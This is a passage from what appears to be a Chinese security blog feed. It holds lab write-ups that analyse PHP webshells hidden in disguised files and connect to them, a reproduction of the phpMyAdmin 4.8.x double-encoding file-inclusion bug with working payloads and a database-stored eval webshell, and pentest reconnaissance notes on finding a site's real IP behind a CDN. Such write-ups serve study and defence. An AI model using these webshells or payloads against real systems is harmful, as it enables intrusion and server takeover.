alt=""></p><p>mozheb1315766f73e9fe22e58b67c107</p><h3 id="0x02-第三题-1"><a href="#0x02-第三题-1" class="headerlink" title="0x02 第三题"></a>0x02 第三题</h3><h4 id="背景-5"><a href="#背景-5" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281620_62.png" alt=""></p><p>下载系统源码，</p><pre><code class="php">查看所有php后缀文件$ag -g . --phpindex.php js/jquery1.42.min.php includes/class-IXR-clientmulticall.php includes/class-IXR-date.php includes/class-IXR-client.php includes/class-IXR-base64.php</code></pre><p>在jquery1.42.min.php存在恶意代码</p><p>D盾查杀也找到对应的文件。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281617_574.png" alt=""></p><pre><code class="php">&lt;?phperror_reporting(0);$g = array(&#39;&#39;,&#39;s&#39;);$gg = a.$g[1].ser.chr(&#39;116&#39;);@$gg($_POST[get]);?&gt;</code></pre><p>这里分析一下webshell代码：</p><p>php中“.”表示将前后单位以字符串形式拼接</p><p>数组g[1]=s, char(116)是t ，gg连起来就是assert</p><p>整个一句话为<code>@$assert($_POST(get))</code></p><p><a href="http://219.153.49.228:47270/www/js/jquery1.42.min.php" target="_blank" rel="external">http://219.153.49.228:47270/www/js/jquery1.42.min.php</a>  密码get</p><p>中国菜刀连接</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281629_99.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281629_506.png" alt=""></p><p>mozhebfb0dc9d53ee0aea51d557142fe</p><h3 id="0x03-第四题"><a href="#0x03-第四题" class="headerlink" title="0x03 第四题"></a>0x03 第四题</h3><h4 id="背景-6"><a href="#背景-6" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h4><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281638_331.png" alt=""></p><p> 下载系统源码，在index.php存在恶意代码</p><pre><code class="php">&lt;?phperror_reporting(0);$e=$_REQUEST[&#39;e&#39;];$arr=array($_POST[&#39;POST&#39;],);array_filter($arr,base64_decode($e));?&gt;</code></pre><p>这里分析一下webshell代码：</p><p>1、发现使用回调函数，各函数解释如下：<br>    ①、<code>$_REQUEST[]</code>,HTTP Request 变量,默认情况下包含了 <code>$_GET，$_POST 和 $_COOKIE</code> 的数组。<br>    ②、array_filter()回调函数,原型为：</p><p><code>array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</code></p><pre><code>       依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。③base64_decode(),对 base64 编码的 data 进行解码。返回原始数据， 或者在失败时返回 FALSE。返回的数据可能是二进制的。</code></pre><p>2、整理后，最终shell代码为</p><p><code>base64_decode($_REQUEST[&#39;e&#39;])(​$_POST[&#39;POST&#39;]);</code></p><p>3、构造assert函数，使用$e参数传递经过base64编码后的assert字符串</p><p><a href="http://219.153.49.228:48776/www/hack/bin.php?e=YXNzZXJ0" target="_blank" rel="external">http://219.153.49.228:48776/www/hack/bin.php?e=YXNzZXJ0</a> 密码POST</p><p>YXNzZXJ0用base64解码的结果是assert  </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281704_36.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281711_538.png" alt=""></p><p>mozhe29055fb55f5c3cae9d29040f187</p><h3 id="0x04-第五题"><a href="#0x04-第五题" class="headerlink" title="0x04 第五题"></a>0x04 第五题</h3><h4 id="背景-7"><a href="#背景-7" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281724_18.png" alt=""></p><p> 下载系统源码，在Exception.php存在恶意代码</p><p>D盾扫描验证</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281733_804.png" alt=""></p><pre><code class="php">error_reporting(0);call_user_func(&#39;assert&#39;, $_REQUEST[&#39;assert&#39;]);</code></pre><p>这里分析一下webshell代码：</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281727_700.png" alt=""></p><p>整理后shell代码为：assert($_REQUEST[‘assert’]);</p><p><a href="http://http://219.153.49.228:47037/www/Exception.php密码assert" target="_blank" rel="external">http://http://219.153.49.228:47037/www/Exception.php密码assert</a></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281729_410.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281731_794.png" alt=""></p><p>mozhed6b28482c826171d5761e39f628</p><h3 id="0x05-第六题"><a href="#0x05-第六题" class="headerlink" title="0x05 第六题"></a>0x05 第六题</h3><h4 id="背景-8"><a href="#背景-8" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281737_575.png" alt=""></p><p> 下载系统源码，在index.php存在恶意代码</p><p>D盾扫描验证</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281738_988.png" alt=""></p><pre><code class="php">&lt;?phperror_reporting(0);$e = $_REQUEST[&#39;e&#39;];$arr = array($_POST[&#39;POST&#39;],);array_map(base64_decode($e), $arr);?&gt;</code></pre><p>这里分析一下webshell代码：</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281739_94.png" alt=""></p><p>构造参数e为经过base64加密后的assert字符串，这样传递过去的assert()，就会对arr数组中的每一个值进行作用，数组中的每一个值进行作用。</p><p>所以整理后：<code>base64_decode($_REQUEST[&#39;e&#39;])($_POST[&#39;POST&#39;]);</code></p><p><a href="http://219.153.49.228:45692/www/Assets/upload/pic3.jpg.php?e=YXNzZXJ0" target="_blank" rel="external">http://219.153.49.228:45692/www/Assets/upload/pic3.jpg.php?e=YXNzZXJ0</a> 密码 POST</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281744_739.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281743_719.png" alt=""></p><p>mozhea53e1e65c45eae8bbabfca9d30c</p><h3 id="0x06-第七题"><a href="#0x06-第七题" class="headerlink" title="0x06 第七题"></a>0x06 第七题</h3><h4 id="背景-9"><a href="#背景-9" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281749_36.png" alt=""></p><p> 下载系统源码，在random_int.php存在恶意代码</p><pre><code class="php">&lt;?phperror_reporting(0);$e = $_REQUEST[&#39;e&#39;];$arr = array(&#39;test&#39;, $_REQUEST[&#39;POST&#39;]);uasort($arr, base64_decode($e));</code></pre><p>这里分析一下webshell代码：</p><p>uasort: </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282045_325.png" alt=""></p><pre><code>通过base64_decode()函数解密后的函数，对$数组进行排序，通过查看arr数组进行排序，通过查看$arr数组可知，其含有$元素，这里可以知道使用可执行函数，对_REQUEST[&#39;POST&#39;]元素，这里可以知道使用可执行函数，对$arr进行排序时，可执行shell代码。所以shell代码如下：base64_decode($_REQUEST[&#39;e&#39;])$_REQUEST[&#39;POST&#39;];</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281754_26.png" alt=""></p><p>mozhe24bcc5751c5d95d68250bfc8771</p><h3 id="0x07-第八题"><a href="#0x07-第八题" class="headerlink" title="0x07 第八题"></a>0x07 第八题</h3><h4 id="背景-10"><a href="#背景-10" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282050_403.png" alt=""></p><p> 下载系统源码，在\fields\class-wp-rest-comment-meta-style.php存在恶意代码</p><p>D盾扫描验证</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282056_478.png" alt=""></p><pre><code class="php">$e = $_REQUEST[&#39;e&#39;];$arr = array($_POST[&#39;pass&#39;] =&gt; &#39;|.*|e&#39;,);array_walk($arr, $e, &#39;&#39;);</code></pre><p>这里分析一下webshell代码：</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282103_450.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282111_382.png" alt=""></p><p> preg_replace() 将 replacement 参数当作 PHP 代码，正则意思为匹配模式出现/e修正符，后面的replacement就会被当作php代码执行，这样我们就可以把 <code>$_POST[&#39;pass&#39;]</code>运行。</p><p><a href="http://219.153.49.228:40515//www/fields/class-wp-rest-comment-meta-style.php?" target="_blank" rel="external">http://219.153.49.228:40515//www/fields/class-wp-rest-comment-meta-style.php?</a> e=preg_replace 密码为pass</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282102_497.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282058_846.png" alt=""></p><p>mozhe43997bb5d7b5b3546758a4724a2</p><h3 id="0x08-第九题"><a href="#0x08-第九题" class="headerlink" title="0x08 第九题"></a>0x08 第九题</h3><h4 id="背景-11"><a href="#背景-11" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p> 下载系统源码，在\pomo\no.php存在恶意代码</p><pre><code class="php">error_reporting(0);$e = $_REQUEST[&#39;e&#39;];//接收e参数数据register_shutdown_function($e, $_REQUEST[&#39;REQUEST&#39;]); //e传入的assert和Request传入内容作用</code></pre><p>D盾扫描验证</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282121_797.png" alt=""></p><p>这里分析一下webshell代码：</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282122_206.png" alt=""></p><p>PHP中止的情况有三种：</p><ul><li><ul><li>执行完成<ul><li>exit/die导致的中止</li><li>发生致命错误中止    </li></ul></li></ul></li></ul><p>等到php函数执行完成，就会调用我们传进去的php中止时执行的函数，构成 <code>assert($_REQUEST[&#39;REQUEST&#39;])</code> ，一句话木马</p><p><a href="http://219.153.49.228:41312/www/pomo/no.php?e=assert" target="_blank" rel="external">http://219.153.49.228:41312/www/pomo/no.php?e=assert</a></p><p>密码：REQUEST</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282326_573.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282326_19.png" alt=""></p><p>mozhe4694154a7d928a98d6db8a0b267</p><h3 id="0x09-第十题"><a href="#0x09-第十题" class="headerlink" title="0x09 第十题"></a>0x09 第十题</h3><h4 id="背景-12"><a href="#背景-12" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282338_522.png" alt=""></p><p> 下载系统源码，在\hack\static\css.php存在恶意代码</p><pre><code class="php">&lt;?php error_reporting(0); $e = $_REQUEST[&#39;e&#39;]; declare(ticks=1); register_tick_function ($e, $_REQUEST[&#39;GET&#39;]); ?&gt;</code></pre><p>D盾扫描验证</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282337_894.png" alt=""></p><p>这里分析一下webshell代码：</p><p>register_tick_function函数必须要和declare流程控制机制合并使用,</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282345_79.png" alt=""></p><p>每执行ticks=1行php代码，就执行一次register_tick_function函数中的代码，当e接收assert时就构成了，<code>$_request[&#39;GET&#39;]</code>是参数，这样就构成了<code>assert($_request[&#39;GET&#39;])</code> </p><p><a href="http://219.153.49.228:40102//www/hack/static/css.php?e=assert" target="_blank" rel="external">http://219.153.49.228:40102//www/hack/static/css.php?e=assert</a> 密码:GET</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282340_126.png" alt=""></p><p>mozhe27968c88c7b957576fe9562274e</p><h3 id="0x0a-第十一题"><a href="#0x0a-第十一题" class="headerlink" title="0x0a 第十一题"></a>0x0a 第十一题</h3><h4 id="背景-13"><a href="#背景-13" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282350_310.png" alt=""></p><p> 下载系统源码，在mysql_conn.php存在恶意代码</p><pre><code class="php">&lt;?php if(!empty($_GET[1]) &amp;&amp; $_GET[1]==&#39;GET.fPZ87&#39;){    $_=@fopen(&#39;t.php&#39;, &#39;a&#39;);    @fwrite($_,&quot;&lt;?php \$_=str_replace(&#39;ilo&#39;,&#39;ass&#39;,str_replace(&#39;vey&#39;,&#39;ert&#39;,\$_GET[2]));@\$_(\$_POST[1]);?&gt;&quot;);    @fclose($_);}?&gt;</code></pre><p>这里分析一下webshell代码：</p><p>若get到的1不为空且1=GET.fPZ87的话执行，创建t.php并写入，写入t.php恶意代码，<code>$GET_[2]</code>接收到的值中的vey替换为ert，ilo替换为ass，也是时候当2=ilovey是，构成assert($_POST[1])，密码为1的一句话。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809290908_564.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809290007_111.png" alt=""></p><p>mozhef880344b9cbe7323d3ef241d16a</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;文章首发于&lt;a href=&quot;https://xz.aliyun.com/t/2821&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;先知社区&lt;/a&gt;,转载请注明来源&lt;/p&gt;
&lt;h2 id=&quot;一、PHP代码分析溯源&quot;&gt;&lt;a href=&quot;#一、PHP代码分析溯
      
    
    </summary>
    
      <category term="代码审计" scheme="http://Bigbroke.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="http://Bigbroke.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>phpMyAdmin 4.8.x 本地文件包含</title>
    <link href="http://Bigbroke.com/archis/767136e1/"/>
    <id>http://Bigbroke.com/archis/767136e1/</id>
    <published>2018-10-27T04:19:37.000Z</published>
    <updated>2018-11-02T14:21:15.676Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-源码分析"><a href="#0x00-源码分析" class="headerlink" title="0x00 源码分析"></a>0x00 源码分析</h2><p>在/index.php     56行：</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/f21383d8fef7c3ed9de41992dab112e2.png" alt="img"></p><p>这里的target 可以直接传值输入。我们可以传入一个本地文件路径去让其包含，就会造成LFI漏洞。</p><p>首先，我们满足4个条件：</p><p>1．传入的target 需要是一个字符串。</p><p>2．不能以/index/ 开头。</p><p>3．不能在$target_blacklist数组内。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/052347bd2743c4b4c356996d842359de.png" alt="img"></p><p>4．满足checkPageValidity函数要求。</p><p>跟踪一下checkPageValidity函数</p><p>在/libraries/classes/Core.php  443行:</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/715e352918c11a7e8029bb2d9a897fe6.png" alt="img"></p><p>该函数内，有三处返回ture的地方，只要有任意一处返回ture就可以。观察这三处，有一个共同点，都是需要$page在$whitelist数组中内才会返回true。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/84f51699726302cc72be152d425b380b.png" alt="img"></p><p>我们先看第一个返回true的地方。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/bae25cd9638b29f7e362378fd4bffd41.png" alt="img"></p><p>这里的<code>`$page</code>在in_array之前没有经过任何的修饰，直接就与$whitelist作比较。没有办法绕过，传入的target值只能为白名单里的文件名才行。很明显，第一个并不能利用。</p><p>再来看第二个</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/7b3e77822c7d3ac4142d3725aaa69bb8.png" alt="img"></p><p>先介绍下这些函数的作用：</p><p>mb_strpos()函数的意思是查找字符串在另一个字符串中首次出现的位置。</p><p>mb_substr()函数的意思是：</p><pre><code>string mb_substr ( string $str, int $start [, int $length = NULL [, string $encoding = mb_internal_encoding()]] )</code></pre><p>从$str字符串中，提取从$start位置开始，长度为$length的字符串。</p><p>可以看出，第二个可以返回ture，我们利用db_sql.php?/../../格式就可以达到目的，绕过白名单限制。那是不是这样就可以造成漏洞了呢？</p><p>假设我们用db_sql.php?/../../../aaa.txt来绕过白名单限制进行包含文件。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/7c62ac55d4b22ce97d63800033f14835.png" alt="img"></p><p>那这里就是 include ‘db_sql.php?/../../../aaa.txt’。</p><p>这种格式并不能跨路径包含，因为php程序把？号后面的东西当成是传入db_sql.php文件的参数。</p><p>再来看第三个：</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/84beb310c9f8c555ea6fb71e0698f371.png" alt="img"></p><p>第三个和第二个对比多出了个urldecode()函数。</p><p>而问题恰恰出在了这个urldecode()函数。</p><p>我们可以利用双重编码绕过，将?经过两次编码%253f就可以绕过白名单验证。</p><p>原因是：</p><p>%253f 传入时，首先会被自动解码一次，变成%3f。然后urldecode()再解码一次，就变成了 ?。 成功绕过了白名单限制。</p><p>这种情况下include的包含情况就是这样的，也就可以任意包含本地文件了。</p><h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><p>1.使用帐号 root ，密码 toor 登录 phpMyAdmin</p><p>2.点击顶部导航栏中的SQL按钮，执行SQL查询</p><pre><code class="sql">select &#39;&lt;?php phpinfo();exit;?&gt;&#39;</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/exp_5.png" alt="VulnSpy"></p><ol><li>获取自己的SESSION ID</li></ol><p>你的 SESSION ID 为 Cookie 中的 <code>phpMyAdmin</code> 项。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/exp_6.png" alt="VulnSpy"></p><p>这样对应的SESSION文件为<code>/var/lib/php/sessions/sess_你的SESSION ID</code>。</p><ol><li>包含SESSION文件，成功利用该漏洞</li></ol><pre><code class="bash">http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/exp_7.png" alt="VulnSpy"></p><h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>将WebShell写入到数据库中然后包含数据库文件，这个方法需要写入数据的权限。</p><p>在phpmyadmin中插入马的字段。比如 <code>&lt;?php eval($_GET[a])?&gt;</code></p><p>此时，如果mysql的路径被猜到的话，其实是可以知道该表中所存储的数据的。</p><pre><code class="vim">?a=phpinfo();&amp;target=db_sql.php%253f/../../../../../../../../var/lib/mysql/test/HACK.ibd</code></pre><p>我不知道应该是ibd还是frm文件，但是最终发现这样会出错，猜测可能是字符编码的问题或者是mysql版本的问题。我mysql的版本比较高。可能数据文件不是这么好读取。</p><p>方法二：利用mysql的data文件：</p><p>不用写文件也能拿Shell的方法。</p><p>我们都知道，登入phpmyadmin后，数据库就是完全可以控制的了，那我们是否可以把WebShell写入到数据库中然后包含数据库文件</p><p>创建一个名为abc的表，并且字段设置为</p><pre><code>&lt;?php eval($_GET[‘z’]); ?&gt;。</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/0b17b8f7210a3d7894dca01435cfe609.png" alt="img"></p><p>保存，然后会在\MySQL\data\test目录下生成三个以数据表名命名的文件。（test为数据库名称）。</p><p>如果你不知道data文件路径，可以用sql查询来获取到它的绝对路径。</p><pre><code>show variables like &#39;%datadir%&#39;;</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/b071d225a03774b04f057f324a390a17.png" alt="img"></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/2101ec2bbe439ab48a8ac574c16e189e.png" alt="img"></p><p>其中，abc.frm文件内容</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/2debae539b0d4aea4aef11dddf6af7b0.png" alt="img"></p><p>Payload：</p><pre><code>/index.php?z=phpinfo();&amp;target=db_sql.php%253f/../../../../../../../../ruanjian/phpstudy/PHPTutorial/MySQL/data/test/abc.frm</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/bebfd31b0d63a338eee12cda98393928.png" alt="img"></p><p>方法三：包含本地系统文件</p><p>Payload:</p><pre><code>/index.php?target=db_sql.php%253f/../../../../../../windows/system.ini</code></pre><h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>参照ChaMd5安全团队发布的文章：<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd" target="_blank" rel="external">phpmyadmin4.8.1后台getshell</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-源码分析&quot;&gt;&lt;a href=&quot;#0x00-源码分析&quot; class=&quot;headerlink&quot; title=&quot;0x00 源码分析&quot;&gt;&lt;/a&gt;0x00 源码分析&lt;/h2&gt;&lt;p&gt;在/index.php     56行：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http
      
    
    </summary>
    
      <category term="WebSecurity" scheme="http://Bigbroke.com/categories/WebSecurity/"/>
    
    
      <category term="复现" scheme="http://Bigbroke.com/tags/%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>《Web安全攻防-渗透测试实战指南》读书笔记</title>
    <link href="http://Bigbroke.com/archis/924987ad/"/>
    <id>http://Bigbroke.com/archis/924987ad/</id>
    <published>2018-10-26T14:05:27.000Z</published>
    <updated>2018-11-02T13:52:15.994Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=45429&amp;highlight=%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0" target="_blank" rel="external">i春秋</a>，转载请注明来源</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文记录书中一些不甚熟悉以及其他扩展的技巧tips，欢迎纠错和交流。</p><h2 id="第1章-渗透测试之信息收集"><a href="#第1章-渗透测试之信息收集" class="headerlink" title="第1章 渗透测试之信息收集"></a><strong>第1章 渗透测试之信息收集</strong></h2><p>进行渗透测试之前，最重要的一步就是信息收集，在这个阶段，我们要尽可能地收集目标的信息。所谓“知己知彼，百战不殆”，我们越是了解测试目标，测试的工作就越是容易。本章主要介绍了域名及子域名信息收集﹑查找真实IP﹑CMS指纹识别﹑目标网站真实IP﹑常用端口的信息收集等。</p><h3 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h3><p>nslookup</p><p>whois</p><p>天眼查</p><h3 id="敏感信息"><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h3><p>谷歌语法</p><p>看burpsuite的response包</p><h3 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h3><p><a href="https://dnsdumpster.com/、在线dns侦查、" target="_blank" rel="external">https://dnsdumpster.com/、在线dns侦查、</a></p><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><p>工具：御剑web指纹识别，what web，webrobo，椰树，轻量web指纹识别，</p><p>在线网站：<a href="http://tools.bugscaner.com/" target="_blank" rel="external">Bugscaner</a>、<a href="http://www.yunsee.cn/" target="_blank" rel="external">云悉指纹</a>、<a href="https://www.whatweb.net/" target="_blank" rel="external">whatweb</a></p><h3 id="查找真实ip"><a href="#查找真实ip" class="headerlink" title="查找真实ip"></a>查找真实ip</h3><p>不存在cdn：<a href="http://www.ip138.com/" target="_blank" rel="external">http://www.ip138.com/</a></p><p>cdn：先用<a href="https://www.17ce.com/多地区ping" target="_blank" rel="external">https://www.17ce.com/多地区ping</a></p><p>绕过方式：</p><ul><li><p>内部邮箱源，ping邮件服务器的域名</p></li><li><p>扫描测试文件 phpinfo</p></li><li><p>分站域名： 主站挂cdn，分站未挂，二级域名突破口</p></li><li><p>国外访问：国内的cdn只针对国内用户访问加速，国外不一定 通过国外在线代理网站：<a href="https://asm.ca.com/en/ping.php" target="_blank" rel="external">https://asm.ca.com/en/ping.php</a></p></li><li><p>查询域名解析记录。<a href="https://www.netcraft.com/" target="_blank" rel="external">https://www.netcraft.com/</a></p></li><li><p>网站有app，burpsuit抓包</p></li><li><p>绕过CloudFlare CDN查找真实IP。CloudFlare Watch</p></li><li><p>用 Zmap 扫全网</p><p>  『我们首先从 apnic 获取 IP 段，然后使用 Zmap 的 banner-grab 扫描出来 80 端口开放的主机进行 banner 抓取，最后在 http-req 中的 Host 写 xiaix.me』（其中xiaix.me是需要寻找真实IP的域名）。说到这个，我就想起了shodan，zoomeye。虽然他们都很强大地能够搜索到全球的IP banner信息，http的banner信息，但是却不能搜索网页代码。</p><p>  有没有一种搜索可以搜索网页标题、内容的方法，这样，我就能找到哪写服务器上运行的网站是与我要找的一致，就能找出真实的服务器IP。在圈子里混，朋友推荐一个新的IOT搜索引擎，跟前面提到的两个相似，叫fofa，WWW.FOFA.SO。这个东西优点是支持HTML源代码检索。</p><p>  举例：找到www.5173.com的真实IP</p><p>  使用ping命令，返回信息有『49k6959vz6ea10u8.alicloudsec.com (218.11.3.155)』，这及时试用了某CDN服务的信号。</p><blockquote><p><strong>ping www.5173.com</strong><br>正在 Ping 49k6959vz6ea10u8.alicloudsec.com [218.11.3.155] 具有 32 字节的数据:<br>来自 218.11.3.155 的回复: 字节=32 时间=34ms TTL=33<br>来自 218.11.3.155 的回复: 字节=32 时间=36ms TTL=33<br>来自 218.11.3.155 的回复: 字节=32 时间=32ms TTL=33<br>来自 218.11.3.155 的回复: 字节=32 时间=31ms TTL=33</p><p>218.11.3.155 的 Ping 统计信息:</p><pre><code>数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，</code></pre><p>往返行程的估计时间(以毫秒为单位):</p><pre><code>最短 = 31ms，最长 = 36ms，平均 = 33ms</code></pre></blockquote><p>  访问www.5173.com，源代码内显示标题有很特别的内容『网络游戏交易平台|手游交易|装备交易|游戏币交易|帐号交易|点卡充值|代练服务-是国内最权威最安全的游戏交易平台-5173.com』，包含有根域名5173.com，这种title是非常特殊的，用来检索，就能找到WWW.5173.COM的真实IP</p><p>  查看www.5173.com的标题</p><p>  将这个标题内容作为关键词搜索，使用语法『title=”网络游戏交易平台|手游交易|装备交易|游戏币交易|帐号交易|点卡充值|代练服务-是国内最权威最安全的游戏交易平台-5173.com”』</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808252056_937.png" alt=""></p><p>  在FOFA上搜索到3个网站包含指定标题</p><p>  在FOFA上搜索到www.5173.com的IP</p><p>  最后，访问<a 